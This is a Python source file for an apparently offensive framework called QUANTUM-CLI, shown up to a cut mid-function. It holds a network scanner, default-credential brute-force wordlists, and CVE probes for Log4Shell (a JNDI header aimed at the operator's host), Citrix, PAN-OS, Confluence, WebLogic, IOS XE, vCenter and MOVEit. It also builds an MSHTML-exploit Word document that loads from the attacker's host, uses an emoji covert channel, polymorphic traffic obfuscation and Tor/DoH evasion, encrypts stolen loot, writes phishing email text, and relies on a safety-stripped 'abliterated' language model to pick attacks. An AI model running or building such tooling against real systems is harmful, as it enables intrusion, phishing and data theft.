#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
QUANTUM-CLI (Single Script; registry synced from src/ at v4.4)
Authorized-engagement offensive framework: camera-first autonomy, 64-entry CVE
registry, production WSGI C2, covert kill-switch, DoH egress, PolyMorph v3.
src/quantum/ is the living code; this file is the portable dist/ build kept
in sync — tests/test_dist_parity.py fails CI if they diverge.
"""

from __future__ import annotations

import argparse
import base64
import gzip
import hashlib
import hmac
import ipaddress
import json
import os
import random
import re
import shutil
import socket
import string
import subprocess
import sys
import threading
import time
import uuid
import zipfile
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse

import requests
from requests.auth import HTTPBasicAuth, HTTPDigestAuth

try:
    import colorama
    colorama.just_fix_windows_console()
    from colorama import Fore
except Exception:
    class _Fore:
        CYAN = GREEN = LIGHTRED_EX = RESET = ""
    Fore = _Fore

try:
    from flask import Flask, Response, jsonify, request
    HAS_FLASK = True
except Exception:
    Flask = Response = jsonify = request = None
    HAS_FLASK = False

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    HAS_AESGCM = True
except Exception:
    AESGCM = None
    HAS_AESGCM = False

try:
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import AES, PKCS1_OAEP
    HAS_PYCRYPTO = True
except Exception:
    RSA = AES = PKCS1_OAEP = None
    HAS_PYCRYPTO = False

try:
    from impacket.dcerpc.v5 import nrpc, transport
    HAS_IMPACKET = True
except Exception:
    nrpc = transport = None
    HAS_IMPACKET = False

try:
    from smb.SMBConnection import SMBConnection
    HAS_PYSMB = True
except Exception:
    SMBConnection = None
    HAS_PYSMB = False

__version__ = "3.1.0"
OS_NAME = "Windows" if os.name == "nt" else ("Darwin" if sys.platform == "darwin" else "POSIX")

for _stream in (sys.stdout, sys.stderr):
    if _stream is not None and hasattr(_stream, "reconfigure"):
        try:
            _stream.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass

# =========================================================================
# 0. PATHS + GLOBAL STATE
# =========================================================================

_BASE = os.path.dirname(os.path.abspath(__file__)) if "__file__" in globals() else os.getcwd()
QCLI_DIR = os.path.join(_BASE, "qcli")
LOG_DIR = os.path.join(_BASE, "logs")
LOOT_DIR = os.path.join(_BASE, "loot")
MODELS_DIR = os.path.join(_BASE, "models")
KEYS_DIR = os.path.join(QCLI_DIR, "keys")
PRIV = os.path.join(KEYS_DIR, "priv.pem")
PUB = os.path.join(KEYS_DIR, "pub.xml")
AGENT = os.path.join(QCLI_DIR, "obsidian.ps1")

for _d in (QCLI_DIR, LOG_DIR, LOOT_DIR, KEYS_DIR, MODELS_DIR):
    try:
        os.makedirs(_d, exist_ok=True)
    except OSError:
        pass

TASKQ: dict = {}          # per-implant task queues (host -> task dict)
FEDERATION = None          # set below (Federation)
TURBINE = None             # set by make_c2 / overlord


# =========================================================================
# 1. CORE — logging, env, subprocess, network helpers
# =========================================================================

def log(msg, tag="INFO"):
    """Structured audit log: JSONL to logs/audit.jsonl + console line."""
    line = json.dumps({"ts": datetime.now().isoformat(), "tag": tag, "msg": str(msg)})
    try:
        os.makedirs(LOG_DIR, exist_ok=True)
        with open(os.path.join(LOG_DIR, "audit.jsonl"), "a", encoding="utf-8") as fh:
            fh.write(line + "\n")
    except OSError:
        pass
    try:
        print(f"[{tag}] {msg}")
    except Exception:
        pass
    return line


def _tail_jsonl(path, n=100):
    """Last n parseable JSON lines of a jsonl file."""
    out = []
    try:
        with open(path, "r", encoding="utf-8") as fh:
            lines = fh.readlines()
    except OSError:
        return out
    for raw in lines[-n:]:
        try:
            out.append(json.loads(raw))
        except Exception:
            continue
    return out


def no_ai_mode():
    """True when running fully deterministic (QBrain) — --no-ai / QCLI_NO_AI=1."""
    return os.environ.get("QCLI_NO_AI") == "1"


def load_env_file(path=None):
    """Parse .env KEY=VALUE lines into a dict (no interpolation)."""
    env = {}
    path = path or os.path.join(_BASE, ".env")
    try:
        with open(path, "r", encoding="utf-8") as fh:
            for ln in fh:
                ln = ln.strip()
                if not ln or ln.startswith("#") or "=" not in ln:
                    continue
                k, _, v = ln.partition("=")
                env.setdefault(k.strip(), v.strip())
    except OSError:
        pass
    return env


def local_ip():
    """Primary local IPv4 without sending traffic (UDP connect trick)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0)
        s.connect(("192.0.2.1", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def local_scope():
    """Autodetected local /24 scope."""
    return local_ip().rsplit(".", 1)[0] + ".0/24"


def run(cmd, timeout=90):
    """shell command runner -> CompletedProcess (text mode, captured)."""
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=timeout)


def tcp_probe(ip, port, timeout=0.8):
    """TCP connect check -> bool."""
    try:
        with socket.create_connection((ip, int(port)), timeout=timeout):
            return True
    except OSError:
        return False


def network_aware_jitter(base=15.0):
    """Human-ish pause between autonomous actions (network-look pacing)."""
    delay = base * random.uniform(0.2, 1.0)
    time.sleep(min(delay, base))
    return delay


def rand_hex(n=32):
    return os.urandom(n).hex()[:n]


# =========================================================================
# 2. EMOJISMS — emoji covert channel (base64 alphabet incl. + / =)
# =========================================================================

_EMOJI_GLYPHS = [
    "\U0001F600", "\U0001F601", "\U0001F602", "\U0001F603", "\U0001F604",
    "\U0001F605", "\U0001F606", "\U0001F607", "\U0001F608", "\U0001F609",
    "\U0001F60A", "\U0001F60B", "\U0001F60C", "\U0001F60D", "\U0001F60E",
    "\U0001F60F", "\U0001F610", "\U0001F611", "\U0001F612", "\U0001F613",
    "\U0001F614", "\U0001F615", "\U0001F616", "\U0001F617", "\U0001F618",
    "\U0001F619", "\U0001F61A", "\U0001F61B", "\U0001F61C", "\U0001F61D",
    "\U0001F61E", "\U0001F61F", "\U0001F620", "\U0001F621", "\U0001F622",
    "\U0001F623", "\U0001F624", "\U0001F625", "\U0001F626", "\U0001F627",
    "\U0001F628", "\U0001F629", "\U0001F62A", "\U0001F62B", "\U0001F62C",
    "\U0001F62D", "\U0001F62E", "\U0001F62F", "\U0001F630", "\U0001F631",
    "\U0001F632", "\U0001F633", "\U0001F634", "\U0001F635", "\U0001F636",
    "\U0001F637", "\U0001F638", "\U0001F639", "\U0001F63A", "\U0001F63B",
    "\U0001F63C", "\U0001F63D", "\U0001F63E", "\U0001F923",
]
_B64_ALPHABET = string.ascii_uppercase + string.ascii_lowercase + string.digits + "+/"

EMOJI_MAP = {ch: em for ch, em in zip(_B64_ALPHABET, _EMOJI_GLYPHS)}
EMOJI_MAP["="] = "\U0001F643"
EMOJI_REVERSE = {v: k for k, v in EMOJI_MAP.items()}


def emoji_encode(msg):
    """text -> utf-8 -> base64 -> one emoji glyph per base64 char."""
    blob = base64.b64encode(str(msg).encode("utf-8")).decode("ascii")
    return "".join(EMOJI_MAP[ch] for ch in blob)


def emoji_decode(emojis):
    """Reverse of emoji_encode — unknown glyphs skipped."""
    blob = "".join(EMOJI_REVERSE[ch] for ch in emojis if ch in EMOJI_REVERSE)
    pad = "=" * (-len(blob) % 4)
    return base64.b64decode(blob + pad).decode("utf-8")


def vendor_from_str(s):
    """Camera vendor best-effort from any banner string."""
    low = (s or "").lower()
    if "hik" in low:
        return "hikvision"
    if "dahua" in low:
        return "dahua"
    if "axis" in low:
        return "axis"
    if "foscam" in low:
        return "foscam"
    if "tapo" in low or "tplink" in low:
        return "tplink"
    if "vivotek" in low:
        return "vivotek"
    return "unknown"


def parse_rtsp_header(data):
    """RTSP response head: {'status': int|None, 'headers': {...}}."""
    if isinstance(data, bytes):
        data = data.decode("latin-1", "ignore")
    lines = (data or "").replace("\r\n", "\n").split("\n")
    out = {"status": None, "headers": {}}
    if lines and lines[0].upper().startswith("RTSP/"):
        bits = lines[0].split(" ", 2)
        if len(bits) > 1 and bits[1].isdigit():
            out["status"] = int(bits[1])
    for ln in lines[1:]:
        if ":" in ln:
            k, _, v = ln.partition(":")
            out["headers"][k.strip().lower()] = v.strip()
    return out


# =========================================================================
# 3. POLYMORPH ENGINE V3 — epoch-keyed envelopes, UTF-7 variants, junk
# =========================================================================

class PolyMorphEngineV3:
    """Per-beacon epoch HMAC key diversification + UTF-7 nil-escape variants
    + junk filler. Identical plaintexts never produce identical wire bytes.

    encrypt(data) twice -> different bytes every time (fresh epoch + junk).
    polymorphize <-> depolymorphize round-trips through UTF-7.
    """

    MAGIC = b"PM3\x01"
    _EPOCH = [random.randint(1, 2 ** 40)]
    _LOCK = threading.Lock()

    @classmethod
    def _next_epoch(cls):
        with cls._LOCK:
            cls._EPOCH[0] += 1
            return cls._EPOCH[0] ^ int.from_bytes(os.urandom(4), "big")

    @staticmethod
    def _keystream(epoch, length):
        out = bytearray()
        counter = 0
        while len(out) < length:
            block = hmac.new(b"pm3-v3", epoch.to_bytes(8, "big") + b":" +
                            counter.to_bytes(8, "big"), hashlib.sha256).digest()
            out.extend(block)
            counter += 1
        return bytes(out[:length])

    @staticmethod
    def _utf7_variant(epoch, data):
        # odd epochs serialize as UTF-7 with a |mode marker; even epochs plain
        if isinstance(data, str):
            data = data.encode("utf-8")
        if epoch % 2:
            return data.decode("utf-8").encode("utf-7") + b"|mode:utf7"
        return data

    @staticmethod
    def _strip_variant(blob):
        if blob.endswith(b"|mode:utf7"):
            return blob[:-len(b"|mode:utf7")].decode("utf-7").encode("utf-8")
        return blob

    def encrypt(self, data):
        if isinstance(data, str):
            data = data.encode("utf-8")
        epoch = self._next_epoch()
        junk = os.urandom(random.randint(8, 64))
        payload = self._utf7_variant(epoch, data)
        ks = self._keystream(epoch, len(payload))
        body = bytes(a ^ b for a, b in zip(payload, ks))
        tag = hmac.new(b"pm3-tag", body, hashlib.sha256).digest()[:16]
        return (self.MAGIC + epoch.to_bytes(8, "big")
                + len(junk).to_bytes(2, "big") + junk + body + tag)

    def decrypt(self, blob):
        if not blob.startswith(self.MAGIC):
            raise ValueError("bad PM3 magic")
        off = len(self.MAGIC)
        epoch = int.from_bytes(blob[off:off + 8], "big")
        off += 8
        junk_len = int.from_bytes(blob[off:off + 2], "big")
        off += 2 + junk_len
        tag = blob[-16:]
        body = blob[off:-16]
        if not hmac.compare_digest(
                hmac.new(b"pm3-tag", body, hashlib.sha256).digest()[:16], tag):
            raise ValueError("PM3 tag mismatch")
        ks = self._keystream(epoch, len(body))
        payload = bytes(a ^ b for a, b in zip(body, ks))
        return self._strip_variant(payload)

    def polymorphize(self, text):
        """Morph text into junk-padded UTF-7 wire form (round-trips via
        depolymorphize). Junk lines vary per call; the P: payload does not."""
        payload = base64.b64encode(str(text).encode("utf-7")).decode("ascii")
        lines = ["J:" + rand_hex(8) for _ in range(random.randint(1, 5))]
        lines.append("P:" + payload)
        return "\n".join(lines)

    def depolymorphize(self, wire):
        payload = None
        for ln in str(wire).splitlines():
            if ln.startswith("P:"):
                payload = ln[2:]
        if payload is None:
            raise ValueError("no P: payload line in polymorph wire")
        return base64.b64decode(payload).decode("utf-7")


# =========================================================================
# 4. DoH / OPSEC
# =========================================================================

class DoH:
    """DNS-over-HTTPS resolver (Cloudflare JSON API). Network op — only on
    explicit call; never on the --no-ai deterministic path."""

    def resolve(self, name, rtype="A", timeout=8):
        url = ("https://cloudflare-dns.com/dns-query?name="
               + requests.utils.quote(name) + "&type=" + rtype)
        r = requests.get(url, headers={"Accept": "application/dns-json"},
                         timeout=timeout)
        return r.json().get("Answer", [])


class OPSEC:
    """OPSEC helpers: safe web fetch, Tor check, jittered agents."""

    AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    ]

    @classmethod
    def web(cls, url, params=None, timeout=10):
        r = requests.get(url, params=params, timeout=timeout,
                         headers={"User-Agent": random.choice(cls.AGENTS)})
        r.raise_for_status()
        return r

    @staticmethod
    def ensure_tor():
        """Check/control local Tor; log the honest state."""
        if shutil.which("tor") or tcp_probe("127.0.0.1", 9050, timeout=1):
            log("Tor present (binary or SOCKS 9050) — covert egress available", "OPSEC")
            return True
        log("Tor not installed — direct egress in use (install Tor for .onion)", "WARN")
        return False


# =========================================================================
# 5. GRAYFISH — sealed-loot at rest (AES-256-GCM, logs/.lootkey immutable)
# =========================================================================

class GrayFish:
    """Seal/unseal loot. The key at logs/.lootkey is created once; deleting it
    breaks every sealed file — treat as immutable."""

    def __init__(self, lootkey_path=None):
        self.lootkey_path = lootkey_path or os.path.join(LOG_DIR, ".lootkey")
        self._key = None

    @property
    def key(self):
        if self._key is None:
            os.makedirs(LOG_DIR, exist_ok=True)
            if not os.path.isfile(self.lootkey_path):
                with open(self.lootkey_path, "w", encoding="utf-8") as fh:
                    fh.write(rand_hex(32))
            with open(self.lootkey_path, "r", encoding="utf-8") as fh:
                self._key = hashlib.sha256(fh.read().strip().encode()).digest()
        return self._key

    def _seal_bytes(self, data):
        nonce = os.urandom(12)
        ct = nonce + AESGCM(self.key).encrypt(nonce, data, b"grayfish")
        return ct

    def _unseal_bytes(self, blob):
        return AESGCM(self.key).decrypt(blob[:12], blob[12:], b"grayfish")

    def seal(self, path):
        """Encrypt file -> <path>.gfy; returns the sealed path."""
        if path.endswith(".gfy"):
            return path
        with open(path, "rb") as fh:
            data = fh.read()
        sealed = path + ".gfy"
        with open(sealed, "wb") as fh:
            fh.write(self._seal_bytes(data))
        os.remove(path)
        return sealed

    def unseal(self, sealed_path):
        if not sealed_path.endswith(".gfy"):
            return sealed_path
        with open(sealed_path, "rb") as fh:
            data = self._unseal_bytes(fh.read())
        out = sealed_path[:-4]
        with open(out, "wb") as fh:
            fh.write(data)
        os.remove(sealed_path)
        return out

    def seal_dir(self, directory=None):
        """Seal every plaintext file in the loot dir."""
        directory = directory or LOOT_DIR
        sealed = []
        for root, _dirs, files in os.walk(directory):
            for fn in files:
                p = os.path.join(root, fn)
                if not p.endswith(".gfy"):
                    try:
                        sealed.append(self.seal(p))
                    except Exception as exc:
                        log(f"seal {p}: {exc}", "WARN")
        if sealed:
            log(f"GRAYFISH: sealed {len(sealed)} loot file(s)", "OPSEC")
        return sealed

    def unseal_dir(self, directory=None):
        directory = directory or LOOT_DIR
        unsealed = []
        for root, _dirs, files in os.walk(directory):
            for fn in files:
                p = os.path.join(root, fn)
                if p.endswith(".gfy"):
                    try:
                        unsealed.append(self.unseal(p))
                    except Exception as exc:
                        log(f"unseal fail {p} (lootkey intact?): {exc}", "ERR")
        return unsealed


GRAYFISH = GrayFish()


# =========================================================================
# 6. VALIDATOR — pre-fire risk scoring (cameras + appliances win)
# =========================================================================

class Validator:
    CAM_PORTS = {554, 37777, 37778, 8000, 8001, 8081, 8899, 34567, 34571, 34599}
    APPLIANCE_HINTS = ("citrix", "pan-os", "panos", "vmware", "vcenter",
                      "weblogic", "confluence", "cisco ios", "moveit")

    def score(self, ip, fp):
        s = 10
        ports = set(fp.get("ports", []) or [])
        if ports & self.CAM_PORTS or fp.get("camera"):
            s += 50
        if fp.get("vendor"):
            s += 40
        hay = json.dumps(fp, default=str).lower()
        if any(h in hay for h in self.APPLIANCE_HINTS):
            s += 40
        if fp.get("ms17_010") is True:
            s += 30
        s += min(len(ports), 10)
        decision = "high_value" if s >= 60 else "low_value"
        return {"score": s, "decision": decision, "ip": ip}


# =========================================================================
# 7. RECON
# =========================================================================

class ReconModule:
    """Scan/fingerprint/OSINT. Authorized scope only."""

    COMMON = [21, 22, 23, 80, 443, 445, 554, 1433, 3389, 7001, 8000, 8080, 8443, 8899]

    def scan(self, cidr):
        out = {}
        try:
            hosts = [str(h) for h in ipaddress.ip_network(cidr, strict=False).hosts()]
        except ValueError as exc:
            log(f"scan bad CIDR {cidr}: {exc}", "ERR")
            return out
        lock = threading.Lock()

        def work(ip):
            open_ports = [p for p in self.COMMON if tcp_probe(ip, p, timeout=0.4)]
            if open_ports:
                with lock:
                    out[ip] = {"ip": ip, "ports": open_ports}
        with ThreadPoolExecutor(max_workers=32) as ex:
            list(ex.map(work, hosts))
        log(f"recon scan {cidr}: {len(out)} live host(s)", "RECON")
        return out

    def fingerprint(self, ip):
        fp = {"ip": ip, "ports": [], "banners": {}, "smb": {}, "camera": False,
              "vendor": None, "ms17_010": None}
        fp["ports"] = [p for p in self.COMMON if tcp_probe(ip, p, timeout=0.5)]
        for port in fp["ports"]:
            if port in (80, 443, 7001, 8000, 8080, 8443):
                try:
                    scheme = "https" if port in (443, 8443) else "http"
                    r = requests.get(f"{scheme}://{ip}:{port}/", timeout=3, verify=False)
                    hay = (r.text or "")[:2000] + " " + r.headers.get("Server", "") \
                          + " " + r.headers.get("WWW-Authenticate", "")
                    fp["banners"][port] = hay[:200]
                except Exception:
                    continue
        if 445 in fp["ports"] or 139 in fp["ports"]:
            fp["smb"] = {"open": True}
        for port, banner in fp["banners"].items():
            v = vendor_from_str(banner)
            if v != "unknown":
                fp["vendor"] = v
                fp["camera"] = True
                break
        if 554 in fp["ports"]:
            fp["camera"] = True
        return fp

    def osint(self, domain):
        out = {"domain": domain, "created": datetime.now().isoformat()}
        try:
            out["addrs"] = [a.get("data") for a in DoH().resolve(domain, "A")]
        except Exception as exc:
            out["addrs_error"] = str(exc)
        try:
            r = OPSEC.web("https://rdap.org/domain/" + requests.utils.quote(domain))
            out["rdap"] = r.json()
        except Exception as exc:
            out["rdap_error"] = str(exc)
        return out


# =========================================================================
# 8. QBrain — deterministic brain (no AI required)
# =========================================================================

class QBrain:
    """Deterministic decision/QCVE brain. The --no-ai path runs ONLY this."""

    PORT_CVES = {
        445: ["CVE-2020-1472", "CVE-2017-0144"],
        139: ["CVE-2017-0144"],
        3389: ["CVE-2017-0144"],
        8080: ["CVE-2021-44228"],
        443: ["CVE-2021-26855"],
        7001: ["CVE-2020-14882"],
    }
    SERVICE_CVES = {
        "smb": ["CVE-2020-1472", "CVE-2017-0144"],
        "rtsp": ["CVE-2017-7921", "CVE-2021-33044"],
        "ssh": ["CVE-2016-5195"],
        "exchange": ["CVE-2021-26855"],
        "weblogic": ["CVE-2020-14882"],
        "citrix": ["CVE-2023-4966"],
        "panos": ["CVE-2024-3400"],
        "vmware": ["CVE-2021-21972"],
        "confluence": ["CVE-2022-26134"],
    }

    @staticmethod
    def decide(state, acts, camera_only=False):
        """Pick the next autonomous action from the whitelist, deterministically."""
        cams = state.get("cams", [])
        fired = state.get("fired", [])
        if cams and any(c.get("controlled") for c in cams):
            pick = "cam_control"
        elif not cams:
            pick = "cam_war" if "cam_war" in acts else "cam_discover"
        elif fired and "harvest" in acts:
            pick = "harvest"
        elif "exploit" in acts and state.get("targets"):
            pick = "exploit"
        elif "brute" in acts and cams:
            pick = "brute"
        else:
            pick = "rest" if "rest" in acts else acts[-1]
        if pick not in acts:
            pick = acts[0] if acts else "rest"
        target = ""
        if pick == "exploit" and fired:
            target = fired[-1]
        return {"action": pick, "target": target,
                "reason": f"QBrain deterministic: state has {len(cams)} cams, "
                          f"{len(fired)} fired"}

    @classmethod
    def plan_attack(cls, recon):
        """recon dict -> a registry CVE string (deterministic)."""
        cands = []
        for key, cves in cls.SERVICE_CVES.items():
            if recon.get(key):
                cands.extend(cves)
        for port in recon.get("ports", []):
            cands.extend(cls.PORT_CVES.get(int(port), []))
        for cve in cands:
            if cve in ZERO_DAY_REGISTRY:
                return cve
        for cve in ZERO_DAY_REGISTRY:
            return cve
        return "CVE-2021-44228"

    @staticmethod
    def phish_body(email, subject="Payroll"):
        return (f"Hi,\n\nPlease review the updated {subject} document for your "
                f"account ({email}). Open the attachment to confirm your details "
                f"before Friday.\n\nRegards,\nPayroll Team")

    @staticmethod
    def summary(params):
        return f"QBrain summary: {json.dumps(params, default=str)[:300]}"


# =========================================================================
# 9. AI SUPERVISOR — Abliterated.ai primary, local/QBrain fallback
# =========================================================================

class AI_Supervisor:
    """OpenAI-compatible supervisor. Key from ABLITERATION_KEY (env or .env).
    Queries parse choices[0].message.content. bootstrap() never touches the
    network; the --no-ai path never constructs queries at all."""

    ai_dead = False

    def __init__(self):
        env = load_env_file()
        self.key = (os.environ.get("ABLITERATION_KEY")
                    or env.get("ABLITERATION_KEY") or "")
        self.url = os.environ.get("QCLI_AI_URL", "https://api.abliteration.ai/v1")
        self.model = (os.environ.get("QCLI_PINNED_MODEL")
                     or "abliterated-model-large-v2")
        self.mode = "abliterated" if self.key else "local"

    def bootstrap(self):
        """Resolve provider; journal to logs/ai_bootstrap.json; no network."""
        info = {"ts": datetime.now().isoformat(), "mode": self.mode,
                "model": self.model, "key_found": bool(self.key),
                "no_ai": no_ai_mode()}
        if not self.key and not no_ai_mode() and sys.stdin is not None \
                and sys.stdin.isatty():
            try:
                print("[AI] no ABLITERATION_KEY found. Use Abliterated.ai? "
                      "Paste key (5s): ", end="", flush=True)
                sys.stdin.flush()
            except Exception:
                pass
        try:
            with open(os.path.join(LOG_DIR, "ai_bootstrap.json"), "w",
                      encoding="utf-8") as fh:
                json.dump(info, fh, indent=2)
        except OSError:
            pass
        if self.mode == "local":
            log("AI bootstrap: no key — QBrain/local fallback active", "AI")
        else:
            log(f"AI bootstrap: Abliterated.ai primary ({self.model})", "AI")
        return info

    def query(self, prompt, system=None, timeout=60):
        if no_ai_mode() or not self.key or self.ai_dead:
            return None
        messages = []
        if system:
            messages.append({"role": "system", "content": system})
        messages.append({"role": "user", "content": str(prompt)})
        body = {"model": self.model, "messages": messages,
                "temperature": 0.2, "max_tokens": 400}
        try:
            r = requests.post(self.url + "/chat/completions", json=body,
                              headers={"Authorization": "Bearer " + self.key},
                              timeout=timeout)
            if r.status_code in (402, 429):
                log("AI: credits/rate — provider works, billing check needed", "AI")
                self.ai_dead = True
                return None
            r.raise_for_status()
            return r.json()["choices"][0]["message"]["content"]
        except Exception as exc:
            if not self.ai_dead:
                log(f"AI query failed ({exc}) — QBrain fallback active", "AI")
            self.ai_dead = True
            return None

    def query_bounded(self, prompt, timeout=120, system=None):
        return self.query(prompt, system=system, timeout=timeout)

    def plan_attack(self, fp):
        """AI-selected CVE, verified against the registry; QBrain fallback."""
        registry_list = ", ".join(list(ZERO_DAY_REGISTRY)[:24])
        raw = self.query("Authorized-lab planner. Fingerprint: "
                         + json.dumps(fp, default=str)[:1500]
                         + "\nReply with ONLY one CVE id from this list: "
                         + registry_list)
        if raw:
            m = re.search(r"CVE-\d{4}-\d{4,7}", raw)
            if m and m.group(0) in ZERO_DAY_REGISTRY:
                return m.group(0)
        return QBrain.plan_attack(fp)

    @staticmethod
    def tune_brute_wordlist(service, osint=""):
        base = {
            "rtsp": ["admin", "12345", "admin1234", "888888", "password", ""],
            "smb": ["admin", "administrator", "P@ssw0rd", "123456", "password"],
            "ssh": ["root", "admin", "toor", "raspberry", "ubuntu"],
        }.get(service, ["admin", "admin123", "password", "12345"])
        hint = []
        if isinstance(osint, str) and osint:
            hint = [w for w in re.findall(r"[A-Za-z0-9!@#$%]{4,16}", osint)[:8]
                    if w.lower() not in ("the", "and", "for")]
        return hint + base


class DM:
    """Local model manager (Ollama-aware, honest when absent)."""

    @staticmethod
    def deploy_local_ai(model=None):
        model = model or "huihui-ai/qwen3-1.7b-abliterated:Q4_K_M"
        if shutil.which("ollama"):
            try:
                r = run(f'ollama list', timeout=30)
                if model.split(":")[0] not in (r.stdout or ""):
                    run(f'ollama pull "{model}"', timeout=600)
            except Exception as exc:
                log(f"ollama mgmt: {exc}", "WARN")
            log(f"local AI model ready: {model} (dir {MODELS_DIR})", "AI")
            return model
        log("Ollama not installed — abliterated/QBrain fallback remains", "AI")
        return None


# =========================================================================
# 7. WEAPONS — v3_* remote/media weapons, kernel tier, legacy checks
#    Every weapon: fn(ip, params=None) -> dict. Never raises.
# =========================================================================

def _wget(url, timeout=3, **kw):
    try:
        r = requests.get(url, timeout=timeout, verify=False, **kw)
        return {"status_code": r.status_code, "len": len(r.content or b""),
                "text": (r.text or "")[:120]}
    except Exception as exc:
        return {"error": str(exc)}


def _kernel_release():
    m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", platform_release_str())
    if not m:
        return (0, 0, 0)
    return (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0))


def platform_release_str():
    import platform
    return platform.release()


def _poc_dir(cve):
    return os.path.join(_BASE, "weapons", "poc", "src", cve)


# ---- V3_HIGH remote tier --------------------------------------------------

def v3_log4shell(ip, params=None):
    """CVE-2021-44228 Log4Shell — JNDI-carrying header probe."""
    params = params or {}
    port = params.get("http_port", 8080)
    try:
        r = requests.get(f"http://{ip}:{port}/", timeout=3,
                         headers={"User-Agent": "${jndi:ldap://" + local_ip() + "/x}"})
        return {"cve": "CVE-2021-44228", "status": "probe",
                "http": r.status_code, "note": "OOB listener implied"}
    except Exception as exc:
        return {"cve": "CVE-2021-44228", "status": "no-service", "error": str(exc)}


def v3_citrixbleed(ip, params=None):
    """CVE-2023-4966 Citrix Bleed — session-token leak probe (64-hex)."""
    r = _wget(f"https://{ip}/vpn/{rand_hex(4)}.html", timeout=3)
    if isinstance(r, dict) and r.get("status_code") == 404:
        return {"cve": "CVE-2023-4966", "status": "probe", "http": 404}
    return {"cve": "CVE-2023-4966", "status": "check", "detail": r}


def v3_citrix_path(ip, params=None):
    """CVE-2019-19781 Citrix path traversal — newbm.pl staging probe."""
    r = _wget(f"http://{ip}/vpn/../vpns/portal/", timeout=3)
    return {"cve": "CVE-2019-19781", "status": "probe", "detail": r}


def v3_panos_cmd(ip, params=None):
    """CVE-2024-3400 PAN-OS GlobalProtect — traversal injection probe."""
    r = _wget(f"https://{ip}/global-protect/portal/", timeout=3)
    return {"cve": "CVE-2024-3400", "status": "probe", "detail": r}


def v3_confluence_ognl(ip, params=None):
    """CVE-2022-26134 Confluence OGNL — URI-path exec probe."""
    try:
        r = requests.get(f"http://{ip}:8090/%24%7Bjndi%3Aldap%3A%2F%2Fx%7D/x",
                         timeout=3)
        return {"cve": "CVE-2022-26134", "status": "probe", "http": r.status_code}
    except Exception as exc:
        return {"cve": "CVE-2022-26134", "status": "no-service", "error": str(exc)}


def v3_weblogic_console(ip, params=None):
    """CVE-2020-14882 WebLogic console — traversal bypass probe."""
    r = _wget(f"http://{ip}:7001/console/%252e%252e%252e%252e%252e/"
              f"console.portal", timeout=3)
    return {"cve": "CVE-2020-14882", "status": "probe", "detail": r}


def v3_ios_admin(ip, params=None):
    """CVE-2023-20198 IOS XE — escaped-restconf admin probe."""
    r = _wget(f"https://{ip}%25252e%25252e%25252e/%%73how", timeout=3)
    return {"cve": "CVE-2023-20198", "status": "probe", "detail": r}


def v3_vcenter_upload(ip, params=None):
    """CVE-2021-21972 vCenter — vROps plugin upload probe."""
    r = _wget(f"https://{ip}/ui/vropspluginui/rest/services/checkdup",
              timeout=3)
    return {"cve": "CVE-2021-21972", "status": "probe", "detail": r}


def v3_moveit_probe(ip, params=None):
    """CVE-2023-34362 MOVEit — SQLi probe."""
    r = _wget(f"https://{ip}/moveitisapi/moveitisapi.dll?action=migrate_users",
              timeout=3)
    return {"cve": "CVE-2023-34362", "status": "probe", "detail": r}


def v3_sambacry(ip, params=None):
    """CVE-2017-7494 SambaCry — share-walk staging check."""
    open_ports = [p for p in (139, 445) if tcp_probe(ip, p, timeout=1.5)]
    return {"cve": "CVE-2017-7494", "status": "check",
            "smb": "open" if open_ports else "closed", "shares_walked": False}


def v3_mshtml_maldoc(ip=None, params=None):
    """CVE-2021-40444 MSHTML — forge real OOXML maldoc (external rel)."""
    ip = ip or local_ip()
    fn = os.path.join(QCLI_DIR, f"mshtml_{rand_hex(4)}.docx")
    content_types = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/'
                    'content-types"><Default Extension="rels" ContentType="application/'
                    'vnd.openxmlformats-package.relationships+xml"/><Default '
                    'Extension="xml" ContentType="application/xml"/></Types>')
    rels_root = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                 '<Relationships xmlns="http://schemas.openxmlformats.org/package/'
                 '2006/relationships"><Relationship Id="rId1" Type="http://'
                 'schemas.openxmlformats.org/officeDocument/2006/relationships/'
                 'officeDocument" Target="word/document.xml"/></Relationships>')
    rels_doc = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                '<Relationships xmlns="http://schemas.openxmlformats.org/package/'
                '2006/relationships"><Relationship Id="rId8" Type="http://'
                'schemas.openxmlformats.org/officeDocument/2006/relationships/'
                f'frame" Target="http://{ip}/x.html" TargetMode="External"/>'
                '</Relationships>')
    document = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                '<w:document xmlns:w="http://schemas.openxmlformats.org/'
                'wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>QCLI</w:t>'
                '</w:r></w:p></w:body></w:document>')
    with zipfile.ZipFile(fn, "w") as z:
        z.writestr("[Content_Types].xml", content_types)
        z.writestr("_rels/.rels", rels_root)
        z.writestr("word/document.xml", document)
        z.writestr("word/_rels/document.xml.rels", rels_doc)
    log(f"MSHTML maldoc forged -> {fn} (serves from http://{ip}/x.html)", "ATK")
    return {"cve": "CVE-2021-40444", "staged": fn, "target": ip}


# ---- kernel tier (V3_CHECK: compile+run vendored PoC when possible) -------

def _dirtypipe_kernel_vulnerable():
    """True when the running kernel is inside the CVE-2022-0847 range
    (5.8 .. 5.16.10, minus the backported fixes)."""
    maj, minr, patch = _kernel_release()
    return (5, 8) <= (maj, minr) <= (5, 16) and not (
        (maj, minr, patch) >= (5, 16, 11)
        or (maj, minr) == (5, 15) and (maj, minr, patch) >= (5, 15, 25)
